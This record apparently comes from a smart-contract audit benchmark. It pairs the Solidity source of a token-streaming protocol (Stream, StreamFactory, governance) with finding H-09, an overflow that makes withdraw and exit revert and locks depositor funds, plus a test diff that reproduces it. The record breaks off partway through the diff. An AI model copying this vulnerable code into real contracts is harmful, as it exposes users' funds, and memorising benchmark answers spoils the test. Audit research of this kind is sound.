function withdraw(uint256 amount) public {\n        weth.withdraw(amount);\n    }\n\n    receive() external payable {}\n}\n\n\n// SPDX-License-Identifier: BUSL-1.1\npragma solidity ^0.8.0;\n\nimport \"./LockeERC20.sol\";\nimport \"solmate/utils/SafeTransferLib.sol\";\nimport \"solmate/tokens/ERC20.sol\";\n\n// ====== Governance =====\ncontract Governed {\n    address public gov;\n    address private pendingGov;\n    address public emergency_gov;\n\n    event NewGov(address indexed oldGov, address indexed newGov);\n    event NewPendingGov(address indexed oldPendingGov, address indexed newPendingGov);\n\n    constructor(address _governor, address _emergency_governor) public {\n        gov = _governor;\n        emergency_gov = _emergency_governor;\n    }\n\n    function governorship() public view returns (address, address, address) {\n        return (gov, emergency_gov, pendingGov);\n    }\n\n    /// Update pending governor\n    function setPendingGov(address newPendingGov) governed public {\n        address old = pendingGov;\n        pendingGov = newPendingGov;\n        emit NewPendingGov(old, newPendingGov);\n    }\n\n    /// Accepts governorship\n    function acceptGov() public {\n        require(pendingGov == msg.sender, \"!pending\");\n        address old = gov;\n        gov = pendingGov;\n        emit NewGov(old, pendingGov);\n    }\n\n    function setEmergencyGov(address who) public governed {\n        emergency_gov = who;\n    } \n\n    /// Remove governor\n    function __abdicate() governed public {\n        address old = gov;\n        gov = address(0);\n        emit NewGov(old, address(0));\n    }\n\n    // ====== Modifiers =======\n    /// Governed function\n    modifier governed {\n        require(msg.sender == gov, \"!gov\");\n        _;\n    }\n\n    /// Emergency governed function\n    modifier emergency_governed {\n        require(msg.sender == gov || msg.sender == emergency_gov, \"!egov\");\n        _;\n    }\n}\n\ninterface IGoverned {\n    function gov() external view returns (address);\n    function emergency_gov() external view returns (address);\n}\n\nabstract contract ExternallyGoverned {\n    IGoverned public gov;\n\n    constructor(address governor) {\n        gov = IGoverned(governor);\n    }\n\n    // ====== Modifiers =======\n    /// Governed function\n    modifier externallyGoverned {\n        require(msg.sender == gov.gov(), \"!gov\");\n        _;\n    }\n\n    /// Emergency governed function\n    modifier externallyEmergencyGoverned {\n        require(msg.sender == gov.gov() || msg.sender == gov.emergency_gov(), \"!e_gov\");\n        _;\n    }\n}\n\ninterface LockeCallee {\n    function lockeCall(address initiator, address token, uint256 amount, bytes calldata data) external;\n}\n\n// ====== Stream =====\ncontract Stream is LockeERC20, ExternallyGoverned {\n    using SafeTransferLib for ERC20;    \n    // ======= Structs ========\n    struct TokenStream {\n        uint256 lastCumulativeRewardPerToken;\n        uint256 virtualBalance;\n        uint112 rewards;\n        uint112 tokens;\n        uint32 lastUpdate;\n        bool merkleAccess;\n    }\n\n    // ======= Storage ========\n    // ==== Immutables =====\n    // stream start time\n    uint32 private immutable startTime;\n    // length of stream\n    uint32 private immutable streamDuration;\n    // length of time depositTokens are locked after stream ends\n    uint32 private immutable depositLockDuration;\n    // length of time rewardTokens are locked after stream ends\n    uint32 private immutable rewardLockDuration;\n\n    // end of stream\n    uint32 private immutable endStream;\n    // end of deposit lock\n    uint32 private immutable endDepositLock;\n    // end of reward lock\n    uint32 private immutable endRewardLock;\n\n    // Token given to depositer\n    address public immutable rewardToken;\n    // Token deposited\n    address public immutable depositToken;\n\n    // This stream's id\n    uint64 public immutable streamId;\n\n    // fee percent on reward tokens\n    uint16 private immutable feePercent;\n    // are fees enabled\n    bool private immutable feeEnabled;\n\n    // deposits are basically a *sale* to the stream creator if true\n    bool public immutable isSale;\n\n    // stream creator\n    address public immutable streamCreator;\n\n    uint112 private immutable depositDecimalsOne;\n    // ============\n\n    //  == sloc a ==\n    // internal reward token amount to be given to depositors\n    uint112 private rewardTokenAmount;\n    // internal deposit token amount locked/to be sold to stream creator\n    uint112 private depositTokenAmount;\n    // ============\n\n    // == slot b ==\n    uint112 private rewardTokenFeeAmount;\n    uint112 private depositTokenFlashloanFeeAmount;\n    uint8 private unlocked = 1;\n    bool private claimedDepositTokens;\n    // ============\n\n    // == slot c ==\n    uint256 private cumulativeRewardPerToken;\n    // ============\n\n    // == slot d ==\n    uint256 private totalVirtualBalance;\n    // ============\n\n    // == slot e ==\n    uint112 public unstreamed;\n    uint112 private redeemedDepositTokens;\n    uint32 private lastUpdate;\n    // ============\n\n    // mapping of address to number of tokens not yet streamed over\n    mapping (address => TokenStream) public tokensNotYetStreamed;\n\n    // external incentives to stream creator\n    mapping (address => uint112) public incentives;\n\n    // ======= Events ========\n    event StreamFunded(uint256 amount);\n    event Staked(address indexed who, uint256 amount);\n    event Withdrawn(address indexed who, uint256 amount);\n    event StreamIncentivized(address indexed token, uint256 amount);\n    event StreamIncentiveClaimed(address indexed token, uint256 amount);\n    event SoldTokensClaimed(address indexed who, uint256 amount);\n    event DepositTokensReclaimed(address indexed who, uint256 amount);\n    event FeesClaimed(address indexed token, address indexed who, uint256 amount);\n    event RecoveredTokens(address indexed token, address indexed recipient, uint256 amount);\n    event RewardsClaimed(address indexed who, uint256 amount);\n    event Flashloaned(address indexed token, address indexed who, uint256 amount, uint256 fee);\n\n    // ======= Modifiers ========\n    modifier updateStream(address who) {\n        // save bytecode space by making it a jump instead of inlining at cost of gas\n        updateStreamInternal(who);\n        _;\n    }\n\n    function updateStreamInternal(address who) internal {\n        require(block.timestamp < endStream , \"!stream\");\n        TokenStream storage ts = tokensNotYetStreamed[msg.sender];\n\n        if (block.timestamp >= startTime) {\n            // set lastUpdates if need be\n            if (ts.lastUpdate == 0) {\n                ts.lastUpdate = uint32(block.timestamp);\n            }\n            if (lastUpdate == 0) {\n                lastUpdate = uint32(block.timestamp);\n            }\n\n            // accumulate reward per token info\n            cumulativeRewardPerToken = rewardPerToken();\n\n            // update user rewards\n            ts.rewards = earned(ts, cumulativeRewardPerToken);\n            // update users last cumulative reward per token\n            ts.lastCumulativeRewardPerToken = cumulativeRewardPerToken;\n\n            // update users unstreamed balance\n            uint32 acctTimeDelta = uint32(block.timestamp) - ts.lastUpdate;\n            if (acctTimeDelta > 0 && ts.tokens > 0) {\n                // some time has passed since this user last interacted\n                // update ts not yet streamed\n                ts.tokens -= uint112(acctTimeDelta * ts.tokens / (endStream - ts.lastUpdate));\n                ts.lastUpdate = uint32(block.timestamp);\n            }\n\n            // handle global unstreamed\n            uint32 tdelta = uint32(block.timestamp - lastUpdate);\n            // stream tokens over\n            if (tdelta > 0 && unstreamed > 0) {\n                uint256 globalStreamingSpeedPerSecond = (uint256(unstreamed) * 10**6)/ (endStream - lastUpdate);\n                unstreamed -= uint112((uint256(tdelta) * globalStreamingSpeedPerSecond) / 10**6);\n            }\n            // already ensure that blocktimestamp is less than endStream so guaranteed ok here\n            lastUpdate = uint32(block.timestamp);\n        } else {\n            if (ts.lastUpdate == 0) {\n                ts.lastUpdate = startTime;\n            }\n            if (lastUpdate == 0) {\n                lastUpdate = startTime;\n            }\n        }\n    }\n\n\n    function lockInternal() internal {\n        require(unlocked == 1, \"re\");\n        unlocked = 2;\n    }\n    modifier lock {\n        lockInternal();\n        _;\n        unlocked = 1;\n    }\n\n    constructor(\n        uint64 _streamId,\n        address creator,\n        bool _isSale,\n        address _rewardToken,\n        address _depositToken,\n        uint32 _startTime,\n        uint32 _streamDuration,\n        uint32 _depositLockDuration,\n        uint32 _rewardLockDuration,\n        uint16 _feePercent,\n        bool _feeEnabled\n\n    )\n        LockeERC20(_depositToken, _streamId, _startTime + _streamDuration)\n        ExternallyGoverned(msg.sender) // inherit factory governance\n        public \n    {\n        // set fee info\n        feePercent = _feePercent;\n        feeEnabled = _feeEnabled;\n\n        // limit feePercent\n        require(feePercent < 10000, \"fee\");\n    \n        // store streamParams\n        startTime = _startTime;\n        streamDuration = _streamDuration;\n        depositLockDuration = _depositLockDuration;\n        rewardLockDuration = _rewardLockDuration;\n\n        endStream = startTime + streamDuration;\n        endDepositLock = endStream + depositLockDuration;\n        endRewardLock = endStream + rewardLockDuration;\n    \n        // set tokens\n        depositToken = _depositToken;\n        rewardToken = _rewardToken;\n\n        // set streamId\n        streamId = _streamId;\n\n        // set sale info\n        isSale = _isSale;\n    \n        streamCreator = creator;\n\n        depositDecimalsOne = uint112(10**ERC20(depositToken).decimals());\n    }\n\n    /**\n     * @dev Returns relevant internal token amounts\n    **/\n    function tokenAmounts() public view returns (uint112, uint112, uint112, uint112) {\n        return (rewardTokenAmount, depositTokenAmount, rewardTokenFeeAmount, depositTokenFlashloanFeeAmount);\n    }\n\n    /**\n     * @dev Returns fee parameters\n    **/\n    function feeParams() public view returns (uint16, bool) {\n        return (feePercent, feeEnabled);\n    }\n\n    /**\n     * @dev Returns stream parameters\n    **/\n    function streamParams() public view returns (uint32,uint32,uint32,uint32) {\n        return (\n            startTime,\n            streamDuration,\n            depositLockDuration,\n            rewardLockDuration\n        );\n    }\n\n    function lastApplicableTime() internal view returns (uint32) {\n        return block.timestamp <= endStream ? uint32(block.timestamp) : endStream;\n    }\n\n    function rewardPerToken() public view returns (uint256) {\n        if (totalVirtualBalance == 0) {\n            return cumulativeRewardPerToken;\n        } else {\n            // \u2206time*rewardTokensPerSecond*oneDepositToken / totalVirtualBalance\n            return cumulativeRewardPerToken + (\n                ((uint256(lastApplicableTime()) - lastUpdate) * rewardTokenAmount * depositDecimalsOne/streamDuration) \n                / totalVirtualBalance\n            );\n        }\n    }\n\n    function dilutedBalance(uint112 amount) internal view returns (uint256) {\n        // duration / timeRemaining * amount\n        if (block.timestamp < startTime) {\n            return amount;\n        } else {\n            uint32 timeRemaining = endStream - uint32(block.timestamp);\n            return ((uint256(streamDuration) * amount * 10**6) / timeRemaining) / 10**6;\n        }\n    }\n\n    function getEarned(address who) public view returns (uint256) {\n        TokenStream storage ts = tokensNotYetStreamed[who];\n        return earned(ts, rewardPerToken());\n    }\n\n    function earned(TokenStream storage ts, uint256 currCumRewardPerToken) internal view returns (uint112) {\n        return uint112(ts.virtualBalance * (currCumRewardPerToken - ts.lastCumulativeRewardPerToken) / depositDecimalsOne) + ts.rewards;\n    }\n\n    /**\n     * @dev Allows _anyone_ to fund this stream, if its before the stream start time\n    **/\n    function fundStream(uint112 amount) public lock {\n        require(amount > 0, \"amt\");\n        require(block.timestamp < startTime, \"time\");\n        uint112 amt;\n\n        // transfer from sender\n        uint256 prevBal = ERC20(rewardToken).balanceOf(address(this));\n        ERC20(rewardToken).safeTransferFrom(msg.sender, address(this), amount);\n        uint256 newBal = ERC20(rewardToken).balanceOf(address(this));\n        require(newBal < type(uint112).max && newBal > prevBal, \"erc\");\n\n        amount = uint112(newBal - prevBal);\n        // if fee is enabled, take a fee\n        if (feeEnabled) {\n            // Safety:\n            //  1. feePercent & y are casted up to u256, so cannot overflow when multiplying\n            //  2. downcast is safe because (x*y)/MAX_X is guaranteed to be smaller than y which is uint112\n            //  3. amount is guaranteed to be greater than feeAmt\n            uint112 feeAmt;\n            unchecked {\n                feeAmt = uint112(uint256(feePercent) * uint256(amount) / 10000); \n                amt = amount - feeAmt;\n            }\n\n            // since this operation can be repeated, we cannot assume no overflow so use checked math\n            rewardTokenFeeAmount += feeAmt;\n            rewardTokenAmount += amt;\n        } else {\n            amt = amount;\n            rewardTokenAmount += amt;\n        }\n        \n        emit StreamFunded(amt);\n    }\n\n    /**\n     *  @dev Deposits depositTokens into this stream\n     * \n     *  additionally, updates tokensNotYetStreamed\n    */ \n    function stake(uint112 amount) public lock updateStream(msg.sender) {\n        require(amount > 0, \"amt\");\n\n        // checked in updateStream\n        // require(block.timestamp < endStream, \"stake:!stream\");\n\n        // transfer tokens over\n        uint256 prevBal = ERC20(depositToken).balanceOf(address(this));\n        ERC20(depositToken).safeTransferFrom(msg.sender, address(this), amount);\n        uint256 newBal = ERC20(depositToken).balanceOf(address(this));\n        require(newBal <= type(uint112).max && newBal > prevBal, \"erc\");\n        \n        uint112 trueDepositAmt = uint112(newBal - prevBal);\n\n        depositTokenAmount += trueDepositAmt;\n        TokenStream storage ts = tokensNotYetStreamed[msg.sender];\n        ts.tokens += trueDepositAmt;\n\n        uint256 virtualBal = dilutedBalance(trueDepositAmt);\n        ts.virtualBalance += virtualBal;\n        totalVirtualBalance += virtualBal;\n        unstreamed += trueDepositAmt;\n\n        if (!isSale) {\n            // not a straight sale, so give the user some receipt tokens\n            _mint(msg.sender, trueDepositAmt);\n        } else {\n        }\n\n        emit Staked(msg.sender, trueDepositAmt);\n    }\n\n    /**\n     *  @dev Allows a stream depositor to withdraw a specific amount of depositTokens during a stream,\n     *  up to their tokensNotYetStreamed amount\n     * \n     *  additionally, updates tokensNotYetStreamed\n    */ \n    function withdraw(uint112 amount) public lock updateStream(msg.sender) {\n        require(amount > 0, \"amt\");\n\n        // checked in updateStream\n        // is the stream still going on? thats the only time a depositer can withdraw\n        // require(block.timestamp < endStream, \"withdraw:!stream\");\n        TokenStream storage ts = tokensNotYetStreamed[msg.sender];\n\n        require(ts.tokens >= amount, \"amt\");\n        ts.tokens -= amount;\n\n        uint256 virtualBal = dilutedBalance(amount);\n        ts.virtualBalance -= virtualBal;\n        totalVirtualBalance -= virtualBal;\n        depositTokenAmount -= amount;\n        if (!isSale) {\n            _burn(msg.sender, amount);\n        } else {\n        }\n\n        // do the transfer\n        ERC20(depositToken).safeTransfer(msg.sender, amount);\n\n        emit Withdrawn(msg.sender, amount);\n    }\n\n    /**\n     *  @dev Allows a stream depositor to exit their entire remaining tokens that haven't streamed\n     *  and burns receiptTokens if its not a sale.\n     * \n     *  additionally, updates tokensNotYetStreamed. Lock is done in withdraw\n    */ \n    function exit() public updateStream(msg.sender) {\n        // checked in updateStream\n        // is the stream still going on? thats the only time a depositer can withdraw\n        // require(block.timestamp < endStream, \"withdraw:!stream\");\n        TokenStream storage ts = tokensNotYetStreamed[msg.sender];\n        uint112 amount = ts.tokens;\n        withdraw(amount);\n    }\n\n    /**\n     *  @dev Allows anyone to incentivize this stream with extra tokens\n     *  and requires the incentive to not be the reward or deposit token\n    */ \n    function createIncentive(address token, uint112 amount) public lock {\n        require(token != rewardToken && token != depositToken, \"inc\");\n        \n        uint256 prevBal = ERC20(token).balanceOf(address(this));\n        ERC20(token).safeTransferFrom(msg.sender, address(this), amount);\n        uint256 newBal = ERC20(token).balanceOf(address(this));\n        require(newBal <= type(uint112).max && newBal > prevBal, \"erc\");\n\n        uint112 amt = uint112(newBal - prevBal);\n        incentives[token] += amt;\n        emit StreamIncentivized(token, amt);\n    }\n\n    /**\n     *  @dev Allows the stream creator to claim an incentive once the stream is done\n    */ \n    function claimIncentive(address token) public lock {\n        // creator is claiming\n        require(msg.sender == streamCreator, \"!creator\");\n        // stream ended\n        require(block.timestamp >= endStream, \"stream\");\n        uint112 amount = incentives[token];\n        require(amount > 0, \"amt\");\n        incentives[token] = 0;\n        ERC20(token).safeTransfer(msg.sender, amount);\n        emit StreamIncentiveClaimed(token, amount);\n    }\n\n    /**\n     *  @dev Allows a receipt token holder to reclaim deposit tokens if the deposit lock is done & their receiptToken amount\n     *  is greater than the requested amount\n    */ \n    function claimDepositTokens(uint112 amount) public lock {\n        require(!isSale, \"sale\");\n        // NOTE: given that endDepositLock is strictly *after* the last time withdraw or exit is callable\n        // we dont need to updateStream(msg.sender)\n        require(amount > 0, \"amt\");\n\n        // is the stream over + the deposit lock period over? thats the only time receiptTokens can be burned for depositTokens after stream is over\n        require(block.timestamp > endDepositLock, \"lock\");\n\n        // burn the receiptTokens\n        _burn(msg.sender, amount);\n\n        redeemedDepositTokens += amount;\n\n        // send the receipt token holder back the funds\n        ERC20(depositToken).safeTransfer(msg.sender, amount);\n\n        emit DepositTokensReclaimed(msg.sender, amount);\n    }\n\n    /**\n     *  @dev Allows a receipt token holder (or original depositor in case of a sale) to claim their rewardTokens\n    */ \n    function claimReward() public lock {\n        require(block.timestamp > endRewardLock, \"lock\");\n\n        TokenStream storage ts = tokensNotYetStreamed[msg.sender];\n        // accumulate reward per token info\n        cumulativeRewardPerToken = rewardPerToken();\n\n        // update user rewards\n        ts.rewards = earned(ts, cumulativeRewardPerToken);\n        // update users last cumulative reward per token\n        ts.lastCumulativeRewardPerToken = cumulativeRewardPerToken;\n\n        lastUpdate = lastApplicableTime();\n\n        uint256 rewardAmt = ts.rewards;\n        ts.rewards = 0;\n\n        require(rewardAmt > 0, \"amt\");\n\n        // transfer the tokens\n        ERC20(rewardToken).safeTransfer(msg.sender, rewardAmt);\n\n        emit RewardsClaimed(msg.sender, rewardAmt);\n    }\n\n    /**\n     *  @dev Allows a creator to claim sold tokens if the stream has ended & this contract is a sale\n    */ \n    function creatorClaimSoldTokens(address destination) public lock {\n        // can only claim when its a sale\n        require(isSale, \"!sale\");\n\n        // only can claim once\n        require(!claimedDepositTokens, \"claimed\");\n        // creator is claiming\n        require(msg.sender == streamCreator, \"!creator\");\n        // stream ended\n        require(block.timestamp >= endStream, \"stream\");\n        \n        uint112 amount = depositTokenAmount;\n        claimedDepositTokens = true;\n\n        ERC20(depositToken).safeTransfer(destination, amount);\n\n        emit SoldTokensClaimed(destination, amount);\n    }\n\n    /**\n     *  @dev Allows the governance contract of the factory to select a destination\n     *  and transfer fees (in rewardTokens) to that address totaling the total fee amount\n    */ \n    function claimFees(address destination) public lock externallyGoverned {\n        // Stream is done\n        require(block.timestamp >= endStream, \"stream\");\n\n        // reset fee amount\n        uint112 fees = rewardTokenFeeAmount;\n        if (fees > 0) {\n            rewardTokenFeeAmount = 0;\n\n            // transfer and emit event\n            ERC20(rewardToken).safeTransfer(destination, fees);\n            emit FeesClaimed(rewardToken, destination, fees);\n        }\n\n        fees = depositTokenFlashloanFeeAmount;\n        if (fees > 0) {\n            depositTokenFlashloanFeeAmount = 0;\n\n            // transfer and emit event\n            ERC20(depositToken).safeTransfer(destination, fees);\n\n            emit FeesClaimed(depositToken, destination, fees);\n        }\n        \n    }\n\n    // ======== Non-protocol functions ========\n\n    /**\n     *  @dev Allows the stream creator to save tokens\n     *  There are some limitations to this:\n     *      1. if its deposit token:\n     *          - DepositLock is fully done\n     *          - There are excess deposit tokens (balance - depositTokenAmount)\n     *      2. if its the reward token:\n     *          - RewardLock is fully done\n     *          - Excess defined as balance - (rewardTokenAmount + rewardTokenFeeAmount)\n     *      3. if incentivized:\n     *          - excesss defined as bal - incentives[token]\n    */ \n    function recoverTokens(address token, address recipient) public lock {\n        // NOTE: it is the stream creators responsibility to save\n        // tokens on behalf of their users.\n        require(msg.sender == streamCreator, \"!creator\");\n        if (token == depositToken) {\n            require(block.timestamp > endDepositLock, \"time\");\n            // get the balance of this contract\n            // check what isnt claimable by either party\n            uint256 excess = ERC20(token).balanceOf(address(this)) - (depositTokenAmount - redeemedDepositTokens);\n            // allow saving of the token\n            ERC20(token).safeTransfer(recipient, excess);\n\n            emit RecoveredTokens(token, recipient, excess);\n            return;\n        }\n        \n        if (token == rewardToken) {\n            require(block.timestamp > endRewardLock, \"time\");\n            // check current balance vs internal balance\n            //\n            // NOTE: if a token rebases, i.e. changes balance out from under us,\n            // most of this contract breaks and rugs depositors. this isn't exclusive\n            // to this function but this function would in theory allow someone to rug\n            // and recover the excess (if it is worth anything)\n\n            // check what isnt claimable by depositors and governance\n            uint256 excess = ERC20(token).balanceOf(address(this)) - (rewardTokenAmount + rewardTokenFeeAmount);\n            ERC20(token).safeTransfer(recipient, excess);\n\n            emit RecoveredTokens(token, recipient, excess);\n            return;\n        }\n\n        if (incentives[token] > 0) {\n            require(block.timestamp >= endStream, \"stream\");\n            uint256 excess = ERC20(token).balanceOf(address(this)) - incentives[token];\n            ERC20(token).safeTransfer(recipient, excess);\n            emit RecoveredTokens(token, recipient, excess);\n            return;\n        }\n\n        // not reward token nor deposit nor incentivized token, free to transfer\n        uint256 bal = ERC20(token).balanceOf(address(this));\n        ERC20(token).safeTransfer(recipient, bal);\n        emit RecoveredTokens(token, recipient, bal);\n    }\n\n    /**\n     *  @dev Allows anyone to flashloan reward or deposit token for a 10bps fee\n    */\n    function flashloan(address token, address to, uint112 amount, bytes memory data) public lock {\n        require(token == depositToken || token == rewardToken, \"erc\");\n\n        uint256 preDepositTokenBalance = ERC20(depositToken).balanceOf(address(this));\n        uint256 preRewardTokenBalance = ERC20(rewardToken).balanceOf(address(this));\n\n        ERC20(token).safeTransfer(to, amount);\n\n        // the `to` contract should have a public function with the signature:\n        // function lockeCall(address initiator, address token, uint256 amount, bytes memory data);\n        LockeCallee(to).lockeCall(msg.sender, token, amount, data);\n\n        uint256 postDepositTokenBalance = ERC20(depositToken).balanceOf(address(this));\n        uint256 postRewardTokenBalance = ERC20(rewardToken).balanceOf(address(this));\n\n        uint112 feeAmt = amount * 10 / 10000; // 10bps fee\n\n        if (token == depositToken) {\n            depositTokenFlashloanFeeAmount += feeAmt;\n            require(preDepositTokenBalance + feeAmt <= postDepositTokenBalance, \"f1\");\n            require(preRewardTokenBalance <= postRewardTokenBalance, \"f2\");\n        } else {\n            rewardTokenFeeAmount += feeAmt;\n            require(preDepositTokenBalance <= postDepositTokenBalance, \"f3\");\n            require(preRewardTokenBalance + feeAmt <= postRewardTokenBalance, \"f4\");\n        }\n\n        emit Flashloaned(token, msg.sender, amount, feeAmt);\n    }\n\n    /**\n     *  @dev Allows inherited governance contract to call functions on behalf of this contract\n     *  This is a potentially dangerous function so to ensure trustlessness, *all* balances\n     *  that may matter are guaranteed to not change.\n     * \n     *  The primary usecase is for claiming potentially airdrops that may have accrued on behalf of this contract\n    */\n    function arbitraryCall(address who, bytes memory data) public lock externallyGoverned {\n        // cannot have an active incentive for the callee\n        require(incentives[who] == 0, \"inc\");\n        // cannot be to deposit token nor reward token\n        require(who != depositToken && who != rewardToken, \"erc\");\n\n        // get token balances\n        uint256 preDepositTokenBalance = ERC20(depositToken).balanceOf(address(this));\n        uint256 preRewardTokenBalance = ERC20(rewardToken).balanceOf(address(this));\n\n        (bool success, bytes memory _ret) = who.call(data);\n        require(success);\n\n        // require no change in balances\n        uint256 postDepositTokenBalance = ERC20(depositToken).balanceOf(address(this));\n        uint256 postRewardTokenBalance = ERC20(rewardToken).balanceOf(address(this));\n        require(preDepositTokenBalance == postDepositTokenBalance && preRewardTokenBalance == postRewardTokenBalance, \"erc\");\n    }\n}\n\ncontract StreamFactory is Governed {\n\n    // ======= Structs ========\n    struct GovernableStreamParams {\n        uint32 maxDepositLockDuration;\n        uint32 maxRewardLockDuration;\n        uint32 maxStreamDuration;\n        uint32 minStreamDuration;\n    }\n\n    struct GovernableFeeParams {\n        uint16 feePercent;\n        bool feeEnabled;\n    }\n\n    // ======= Storage ========\n    GovernableStreamParams public streamParams;\n    GovernableFeeParams public feeParams;\n    uint64 public currStreamId; \n\n    uint16 constant MAX_FEE_PERCENT = 500; // 500/10000 == 5%\n\n    // =======  Events  =======\n    event StreamCreated(uint256 indexed stream_id, address stream_addr);\n    event StreamParametersUpdated(GovernableStreamParams oldParams, GovernableStreamParams newParams);\n    event FeeParametersUpdated(GovernableFeeParams oldParams, GovernableFeeParams newParams);\n\n    constructor(address _governor, address _emergency_governor) public Governed(_governor, _emergency_governor) {\n        streamParams = GovernableStreamParams({\n            maxDepositLockDuration: 52 weeks,\n            maxRewardLockDuration: 52 weeks,\n            maxStreamDuration: 2 weeks,\n            minStreamDuration: 1 hours\n        });\n    }\n\n    /**\n     * @dev Deploys a minimal contract pointing to streaming logic. This contract will also be the token contract\n     * for the receipt token. It custodies the depositTokens until depositLockDuration is complete. After\n     * lockDuration is completed, the depositTokens can be claimed by the original depositors\n     * \n    **/\n    function createStream(\n        address rewardToken,\n        address depositToken,\n        uint32 startTime,\n        uint32 streamDuration,\n        uint32 depositLockDuration,\n        uint32 rewardLockDuration,\n        bool isSale\n    )\n        public\n        returns (Stream)\n    {\n        // perform checks\n\n        {\n            require(startTime >= block.timestamp, \"past\");\n            require(streamDuration >= streamParams.minStreamDuration && streamDuration <= streamParams.maxStreamDuration, \"stream\");\n            require(depositLockDuration <= streamParams.maxDepositLockDuration, \"lock\");\n            require(rewardLockDuration <= streamParams.maxRewardLockDuration, \"reward\");\n        }\n        \n\n        // TODO: figure out sane salt, i.e. streamid + x? streamid guaranteed to be unique\n        uint64 that_stream = currStreamId;\n        currStreamId += 1;\n        bytes32 salt = bytes32(uint256(that_stream));\n\n        Stream stream = new Stream{salt: salt}(\n            that_stream,\n            msg.sender,\n            isSale,\n            rewardToken,\n            depositToken,\n            startTime,\n            streamDuration,\n            depositLockDuration,\n            rewardLockDuration,\n            feeParams.feePercent,\n            feeParams.feeEnabled\n        );\n\n        emit StreamCreated(that_stream, address(stream));\n\n        return stream;\n    }\n\n    function updateStreamParams(GovernableStreamParams memory newParams) public governed {\n        // DATA VALIDATION:\n        //  there is no real concept of \"sane\" limits here, and if misconfigured its ultimated\n        //  not a massive deal so no data validation is done\n        GovernableStreamParams memory old = streamParams;\n        streamParams = newParams;\n        emit StreamParametersUpdated(old, newParams);\n    }\n\n    function updateFeeParams(GovernableFeeParams memory newFeeParams) public governed {\n        require(newFeeParams.feePercent <= MAX_FEE_PERCENT, \"fee\");\n        GovernableFeeParams memory old = feeParams;\n        feeParams = newFeeParams;\n        emit FeeParametersUpdated(old, newFeeParams);\n    }\n}\n\n\n",
        "CodeNames": [
            "WETH.t.sol",
            "Locke.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-09",
                "Location": [
                    "\ndiff --git a/Streaming/src/test/Locke.t.sol b/Streaming/src/test/Locke.t.sol\nindex 2be8db0..aba19ce 100644\n--a/Streaming/src/test/Locke.t.sol\n+++ b/Streaming/src/test/Locke.t.sol\n@@ -166,14 +166,14 @@ contract StreamTest is LockeTest {\n         );\n \n         testTokenA.approve(address(stream), type(uint256).max);\n       stream.fundStream((1014)*1018);\n+        stream.fundStream(1000);\n \n       alice.doStake(stream, address(testTokenB), (1013)*1018);\n+        alice.doStake(stream, address(testTokenB), 100);\n \n \n         hevm.warp(startTime + minStreamDuration / 2); // move to half done\n         \n       bob.doStake(stream, address(testTokenB), (1013)*1018);\n+        bob.doStake(stream, address(testTokenB), 100);\n \n         hevm.warp(startTime + minStreamDuration / 2 + minStreamDuration / 10);\n \n@@ -182,10 +182,10 @@ contract StreamTest is LockeTest {\n         hevm.warp(startTime + minStreamDuration + 1); // warp to end of stream\n \n \n       // alice.doClaimReward(stream);\n       // assertEq(testTokenA.balanceOf(address(alice)), 533*(1015));\n       // bob.doClaimReward(stream);\n       // assertEq(testTokenA.balanceOf(address(bob)), 466*(1015));\n+        alice.doClaimReward(stream);\n+        assertEq(testTokenA.balanceOf(address(alice)), 533);\n+        bob.doClaimReward(stream);\n+        assertEq(testTokenA.balanceOf(address(bob)), 466);\n     }\n \n     function test_stake() public {\ndiff --git a/Streaming/src/test/utils/LockeTest.sol b/Streaming/src/test/utils/LockeTest.sol\nindex eb38060..a479875 100644\n--a/Streaming/src/test/utils/LockeTest.sol\n+++ b/Streaming/src/test/utils/LockeTest.sol\n@@ -90,11 +90,11 @@ abstract contract LockeTest is TestHelpers {\n         testTokenA = ERC20(address(new TestToken(\"Test Token A\", \"TTA\", 18)));\n         testTokenB = ERC20(address(new TestToken(\"Test Token B\", \"TTB\", 18)));\n         testTokenC = ERC20(address(new TestToken(\"Test Token C\", \"TTC\", 18)));\n       write_balanceOf_ts(address(testTokenA), address(this), (1014)*1018);\n       write_balanceOf_ts(address(testTokenB), address(this), (1014)*1018);\n       write_balanceOf_ts(address(testTokenC), address(this), (1014)*1018);\n       assertEq(testTokenA.balanceOf(address(this)), (1014)*1018);\n       assertEq(testTokenB.balanceOf(address(this)), (1014)*1018);\n+        write_balanceOf_ts(address(testTokenA), address(this), 100*1018);\n+        write_balanceOf_ts(address(testTokenB), address(this), 100*1018);\n+        write_balanceOf_ts(address(testTokenC), address(this), 100*1018);\n+        assertEq(testTokenA.balanceOf(address(this)), 100*1018);\n+        assertEq(testTokenB.balanceOf(address(this)), 100*1018);\n \n         defaultStreamFactory = new StreamFactory(address(this), address(this));\n \n"
                ],
                "Type": " DOS while dealing with erc20 when value(i.e amount*decimals)  is high but less than type(uint112).max",
                "Description": "\n\n<https://github.com/code-423n4/2021-11-streaming/blob/main/Streaming/src/Locke.sol#L229\n\nreverts due to overflow for higher values (but strictly less than type(uint112).max) and hence when user calls exit or withdraw function it will revert and that user will not able to withdraw funds permanentaly.\n\n\nAttaching diff to modify tests to reproduce behaviour:\n\n\ndiff --git a/Streaming/src/test/Locke.t.sol b/Streaming/src/test/Locke.t.sol\nindex 2be8db0..aba19ce 100644\n--a/Streaming/src/test/Locke.t.sol\n+++ b/Streaming/src/test/Locke.t.sol\n@@ -166,14 +166,14 @@ contract StreamTest is LockeTest {\n         );\n \n         testTokenA.approve(address(stream), type(uint256).max);\n       stream.fundStream((1014)*1018);\n+        stream.fundStream(1000);\n \n       alice.doStake(stream, address(testTokenB), (1013)*1018);\n+        alice.doStake(stream, address(testTokenB), 100);\n \n \n         hevm.warp(startTime + minStreamDuration / 2); // move to half done\n         \n       bob.doStake(stream, address(testTokenB), (1013)*1018);\n+        bob.doStake(stream, address(testTokenB), 100);\n \n         hevm.warp(startTime + minStreamDuration / 2 + minStreamDuration / 10);\n \n@@ -182,10 +182,10 @@ contract StreamTest is LockeTest {\n         hevm.warp(startTime + minStreamDuration + 1); // warp to end of stream\n \n \n       // alice.doClaimReward(stream);\n       // assertEq(testTokenA.balanceOf(address(alice)), 533*(1015));\n       // bob.doClaimReward(stream);\n       // assertEq(testTokenA.balanceOf(address(bob)), 466*(1015));\n+        alice.doClaimReward(stream);\n+        assertEq(testTokenA.balanceOf(address(alice)), 533);\n+        bob.doClaimReward(stream);\n+        assertEq(testTokenA.balanceOf(address(bob)), 466);\n     }\n \n     function test_stake() public {\ndiff --git a/Streaming/src/test/utils/LockeTest.sol b/Streaming/src/test/utils/LockeTest.sol\nindex eb38060..a479875 100644\n--a/Streaming/src/test/utils/LockeTest.sol\n+++ 